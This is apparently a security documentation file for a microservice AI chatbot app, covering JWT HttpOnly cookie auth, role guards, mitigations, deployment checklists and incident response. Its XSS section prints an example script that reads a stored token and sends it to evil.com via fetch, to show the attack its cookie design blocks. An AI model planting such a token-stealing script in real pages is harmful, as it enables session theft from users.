# Security Documentation

**Project:** AI Chatbot Full-Stack Application  
**Last Updated:** November 22, 2025  
**Status:** ✅ Active Development - Security Measures Implemented

---

## Table of Contents

1. [Overview](#overview)
2. [Authentication & Authorization](#authentication--authorization)
3. [JWT Token Security](#jwt-token-security)
4. [Admin Access Control](#admin-access-control)
5. [Common Vulnerabilities & Mitigations](#common-vulnerabilities--mitigations)
6. [Production Deployment Checklist](#production-deployment-checklist)
7. [Security Testing](#security-testing)
8. [Incident Response](#incident-response)

---

## Overview

This document covers all security implementations, best practices, and deployment requirements for the AI Chatbot application. The application uses a microservices architecture with separate auth, admin, chatbot, and profile services.

### Security Principles

1. **Defense in Depth** - Multiple layers of security controls
2. **Least Privilege** - Users have minimum necessary permissions
3. **Secure by Default** - Production-ready security configurations
4. **Zero Trust** - Verify every request, assume breach

### Current Security Posture

- ✅ HttpOnly cookie-based authentication
- ✅ Role-based access control (RBAC)
- ✅ Defense-in-depth authorization checks
- ✅ JWT token expiration and refresh mechanisms
- ✅ Password hashing with bcrypt
- ⚠️ Development mode uses localStorage for cross-port compatibility

---

## Authentication & Authorization

### User Roles

```typescript
enum UserRole {
  USER = 'USER', // Standard user - access to chatbot, profile
  ADMIN = 'ADMIN', // Admin user - full access including admin panel
  MODERATOR = 'MODERATOR', // Future: Moderate content, limited admin access
}
```

### Authentication Flow

```
1. User submits credentials (email + password)
   ↓
2. Auth service validates against database
   ↓
3. Password verified using bcrypt.compare()
   ↓
4. Generate JWT tokens:
   - accessToken (15 min expiry)
   - refreshToken (7 day expiry)
   ↓
5. Set HttpOnly cookies with tokens
   ↓
6. Return user object (NO tokens in response body)
   ↓
7. Frontend stores user in auth store
   ↓
8. Subsequent requests include cookies automatically
```

### Authorization Layers

**Layer 1: Shell Route Guards**

```typescript
// Protect routes at shell level
<Route path="/admin/*" element={<AdminRoute><AdminMFE /></AdminRoute>} />

// AdminRoute checks:
- isAuthenticated === true
- user.role === 'ADMIN'
```

**Layer 2: MFE Root Guards**

```typescript
// Protect entire MFE
function AppContent() {
  useRequireRole('ADMIN'); // Redirects if unauthorized
  return <Routes>...</Routes>;
}
```

**Layer 3: Page-Level Guards**

```typescript
// Protect individual pages
function AdminDashboardPage() {
  useRequireRole('ADMIN'); // Double-check on page load
  return <Dashboard />;
}
```

**Layer 4: Backend API Middleware**

```typescript
// Protect API endpoints
router.get('/stats', authMiddleware, adminMiddleware, getStats);

// authMiddleware: Validates JWT
// adminMiddleware: Checks role === 'ADMIN'
```

---

## JWT Token Security

### Token Strategy

#### Development Environment

**Challenge:** Services run on different ports (shell: 5173, services: 3001-3002)

- Browsers block cookies across ports (same-origin policy)
- HttpOnly cookies don't work cross-port

**Solution:** Dual-strategy authentication

```typescript
// Tokens stored in BOTH:
1. localStorage (for dev cross-port API calls)
2. HttpOnly cookies (for production readiness)

// Request interceptor checks localStorage first
if (isDev) {
  const token = localStorage.getItem('auth-storage').state.accessToken;
  config.headers.Authorization = `Bearer ${token}`;
}
```

**Security Trade-off:**

- ⚠️ Tokens accessible to JavaScript (XSS risk)
- ✅ Acceptable for local development only
- ✅ Behind authenticated routes, not public

#### Production Environment

**Setup:** All services behind API gateway on same domain

```
Frontend:  https://app.example.com
Backend:   https://app.example.com/api/*
  ├─ /api/auth/*    → auth-service
  ├─ /api/admin/*   → admin-service
  ├─ /api/chatbot/* → chatbot-service
```

**Solution:** HttpOnly cookies only

```typescript
res.cookie('accessToken', token, {
  httpOnly: true, // ✅ NOT accessible to JavaScript
  secure: true, // ✅ HTTPS only
  sameSite: 'strict', // ✅ CSRF protection
  domain: '.example.com', // Works across subdomains
  maxAge: 15 * 60 * 1000, // 15 minutes
});
```

**Benefits:**

- ✅ XSS attacks cannot steal tokens
- ✅ Automatic CSRF protection
- ✅ Secure transport (HTTPS)
- ✅ Industry best practice

### Token Validation

**Backend Middleware:**

```typescript
// apps/auth-service/src/middleware/auth.middleware.ts
// Checks BOTH Authorization header AND cookies

let token: string | null = null;

// Try Authorization header first (for API clients)
if (authHeader?.startsWith('Bearer ')) {
  token = authHeader.substring(7);
}
// Fall back to HttpOnly cookie (for browser)
else if (req.cookies?.accessToken) {
  token = req.cookies.accessToken;
}

// Verify JWT
const decoded = jwt.verify(token, JWT_SECRET);
req.user = decoded; // Attach to request
```

### Token Refresh

```typescript
// Automatic refresh when accessToken expires
POST /api/auth/refresh
Cookie: refreshToken=<token>

// Returns:
- New accessToken (15 min)
- New refreshToken (7 days)
- Set as HttpOnly cookies
```

---

## Admin Access Control

### Problem (Fixed)

Admin users experienced 401 errors when accessing `/admin` routes. Root causes:

1. Missing role guards in admin pages
2. Inconsistent token handling between services
3. Admin-service middleware only checked Authorization header, not cookies

### Solution

**1. Defense-in-Depth Role Guards**

All admin pages now have triple validation:

```typescript
// Shell → MFE Root → Individual Page
<AdminRoute>(<AppContent>{
  /* useRequireRole('ADMIN') */
}) <
  AdminDashboardPage >
  {
    /* useRequireRole('ADMIN') */
  };
```

**2. Consistent Token Middleware**

Updated admin-service to match auth-service pattern:

```typescript
// Check BOTH Authorization header AND cookies
if (authHeader?.startsWith('Bearer ')) {
  token = authHeader.substring(7);
} else if (req.cookies?.accessToken) {
  token = req.cookies.accessToken;
}
```

**3. Cookie Parser Middleware**

Added `cookie-parser` to all services:

```typescript
import cookieParser from 'cookie-parser';
app.use(cookieParser()); // Parse cookies from requests
```

### Testing Admin Access

```bash
# 1. Login as admin
curl -c cookies.txt -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin123"}'

# 2. Access admin endpoint
curl -b cookies.txt http://localhost:3002/api/admin/stats

# Expected: 200 OK with dashboard stats
```

---

## Common Vulnerabilities & Mitigations

### 1. XSS (Cross-Site Scripting)

**Risk:** Attacker injects malicious JavaScript into application

**Mitigations:**

- ✅ HttpOnly cookies (tokens not accessible to JavaScript)
- ✅ Input sanitization on backend
- ✅ React escapes output by default
- ✅ Content Security Policy headers (production)
- ⚠️ Avoid `dangerouslySetInnerHTML` unless necessary

**Example Attack Prevented:**

```javascript
// Attacker tries to steal token
<script>
  const token = localStorage.getItem('auth-storage'); // ❌ Returns null in prod
  fetch('https://evil.com/steal?token=' + token);
</script>
// Fails because tokens are in HttpOnly cookies
```

### 2. CSRF (Cross-Site Request Forgery)

**Risk:** Attacker tricks user into making unwanted requests

**Mitigations:**

- ✅ SameSite=Strict cookies
- ✅ CORS configuration restricts origins
- ✅ Backend validates request origin
- 🔄 Future: CSRF tokens for state-changing operations

### 3. SQL Injection

**Risk:** Attacker manipulates database queries

**Mitigations:**

- ✅ Prisma ORM with parameterized queries
- ✅ No raw SQL queries
- ✅ Input validation with Zod schemas
- ✅ Type safety with TypeScript

### 4. Broken Authentication

**Risk:** Weak passwords, token theft, session fixation

**Mitigations:**

- ✅ Bcrypt password hashing (cost factor: 10)
- ✅ JWT tokens with expiration
- ✅ Refresh token rotation
- ✅ Secure cookie configuration
- 🔄 Future: Password complexity requirements
- 🔄 Future: Rate limiting on login attempts

### 5. Sensitive Data Exposure

**Risk:** Secrets, tokens, PII exposed in logs or responses

**Mitigations:**

- ✅ Tokens in HttpOnly cookies (not response body)
- ✅ Environment variables for secrets
- ✅ `.env` files in `.gitignore`
- ✅ Password fields use `type="password"`
- ⚠️ Never log sensitive data

### 6. Broken Access Control

**Risk:** Users access unauthorized resources

**Mitigations:**

- ✅ Role-based access control (RBAC)
- ✅ Defense-in-depth authorization (4 layers)
- ✅ Backend validates every request
- ✅ Frontend guards for UX only (not security)

### 7. Security Misconfiguration

**Risk:** Default configs, verbose errors, open ports

**Mitigations:**

- ✅ CORS restricted to known origins
- ✅ Error messages don't leak stack traces (production)
- ✅ HTTPS enforced (production)
- ✅ Security headers configured
- 🔄 Regular dependency updates

---

## Production Deployment Checklist

### Pre-Deployment

- [ ] **Secrets Management**
  - [ ] Generate strong JWT secrets: `crypto.randomBytes(32).toString('hex')`
  - [ ] Store secrets in environment variables (not `.env` files)
  - [ ] Use secrets manager (AWS Secrets Manager, Azure Key Vault, etc.)
  - [ ] Rotate all development secrets

- [ ] **Infrastructure**
  - [ ] All services behind API gateway on same domain
  - [ ] HTTPS enabled with valid SSL certificate
  - [ ] Database uses SSL/TLS connections
  - [ ] Redis uses AUTH and encryption

- [ ] **Token Strategy**
  - [ ] Remove localStorage token persistence from auth store
  - [ ] Remove Authorization header logic from MFE interceptors (if using cookies only)
  - [ ] Verify HttpOnly cookies work across all services
  - [ ] Set cookie `secure: true` flag

- [ ] **CORS Configuration**
  - [ ] Restrict origins to production domains only
  - [ ] Remove `localhost` from allowed origins
  - [ ] Enable `credentials: true` for cookie support

- [ ] **Security Headers**

  ```nginx
  add_header X-Frame-Options "SAMEORIGIN";
  add_header X-Content-Type-Options "nosniff";
  add_header X-XSS-Protection "1; mode=block";
  add_header Strict-Transport-Security "max-age=31536000";
  add_header Content-Security-Policy "default-src 'self'";
  ```

- [ ] **Environment Variables**
  - [ ] `NODE_ENV=production`
  - [ ] `JWT_SECRET` (strong random value)
  - [ ] `JWT_REFRESH_SECRET` (different from JWT_SECRET)
  - [ ] `DATABASE_URL` (production database)
  - [ ] `REDIS_URL` (production Redis)
  - [ ] `OPENAI_API_KEY` (if applicable)

### Post-Deployment

- [ ] Verify HTTPS works
- [ ] Test login/logout flow
- [ ] Test token refresh
- [ ] Verify cookies are HttpOnly and Secure
- [ ] Test admin access control
- [ ] Check security headers
- [ ] Review application logs for errors
- [ ] Monitor for suspicious activity

### Monitoring

- [ ] Set up authentication failure alerts
- [ ] Monitor failed login attempts
- [ ] Track token refresh failures
- [ ] Alert on unauthorized access attempts
- [ ] Log admin actions (audit trail)

---

## Security Testing

### Manual Testing

**1. Authentication Flow**

```bash
# Test login
curl -i -c cookies.txt -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}'

# Check cookies set
grep accessToken cookies.txt  # Should show HttpOnly cookie

# Test authenticated request
curl -b cookies.txt http://localhost:3002/api/admin/stats

# Test logout
curl -b cookies.txt -c cookies.txt -X POST http://localhost:3001/api/auth/logout
```

**2. Authorization Testing**

```bash
# Login as regular user
curl -c user-cookies.txt -X POST ... {"email":"user@example.com",...}

# Try to access admin endpoint (should fail)
curl -b user-cookies.txt http://localhost:3002/api/admin/stats
# Expected: 403 Forbidden
```

**3. Token Expiration**

```bash
# Login
# Wait 16 minutes (accessToken expires at 15 min)
# Try authenticated request (should trigger refresh)
curl -b cookies.txt http://localhost:3002/api/admin/stats
```

### Browser Testing

**1. Check HttpOnly Cookies**

- Open DevTools → Application → Cookies
- Verify `accessToken` and `refreshToken` present
- Verify "HttpOnly" column is checked
- Try `document.cookie` in console (should not show tokens)

**2. Check localStorage**

```javascript
// In browser console
JSON.parse(localStorage.getItem('auth-storage'));
// Should contain user object and isAuthenticated
// Should NOT contain accessToken/refreshToken in production
```

**3. Test Role-Based Access**

- Login as regular user
- Navigate to `/admin` → Should redirect to `/dashboard`
- Login as admin user
- Navigate to `/admin` → Should load admin dashboard

### Automated Testing

**Future: Security Test Suite**

```bash
# Run security tests
npm run test:security

# Tests include:
- Authentication flow
- Authorization checks
- Token expiration
- Cookie security
- CORS policies
- Input validation
- SQL injection attempts
- XSS prevention
```

---

## Incident Response

### Suspected Token Theft

**1. Immediate Actions**

```bash
# Rotate JWT secrets
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Update JWT_SECRET and JWT_REFRESH_SECRET

# Restart all services
# This invalidates ALL existing tokens
```

**2. Investigation**

- Check application logs for suspicious activity
- Review recent login attempts
- Check for unusual API access patterns
- Identify affected users

**3. User Notification**

- Force logout all users
- Notify affected users to reset passwords
- Document incident

### Suspected Data Breach

**1. Contain**

- Disable affected services
- Revoke compromised credentials
- Block suspicious IP addresses

**2. Investigate**

- Review database access logs
- Check for unauthorized queries
- Identify scope of breach

**3. Remediate**

- Patch vulnerabilities
- Reset all secrets
- Force password resets

**4. Report**

- Document incident
- Notify users if required (GDPR, etc.)
- Implement additional controls

### Security Contact

For security issues, contact:

- **Email:** security@yourcompany.com
- **Response Time:** 24 hours for critical issues

---

## Additional Resources

### Internal Documentation

- **Admin Authentication:** `docs/ADMIN_AUTH_SECURITY.md`
- **Design System:** `libs/frontend/ui-components/DESIGN_SYSTEM.md`
- **API Documentation:** Available at `/api-docs` on each service

### External Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

### Dependencies

Keep these updated for security patches:

```json
{
  "jsonwebtoken": "^9.0.0",
  "bcrypt": "^5.1.0",
  "cookie-parser": "^1.4.6",
  "helmet": "^7.0.0",
  "express-rate-limit": "^6.0.0"
}
```

### Review Schedule

- **Weekly:** Review failed authentication logs
- **Monthly:** Dependency security audit (`npm audit`)
- **Quarterly:** Full security review and penetration testing
- **Annually:** Third-party security audit

---

**Last Reviewed:** November 22, 2025  
**Next Review:** December 22, 2025  
**Reviewer:** Development Team
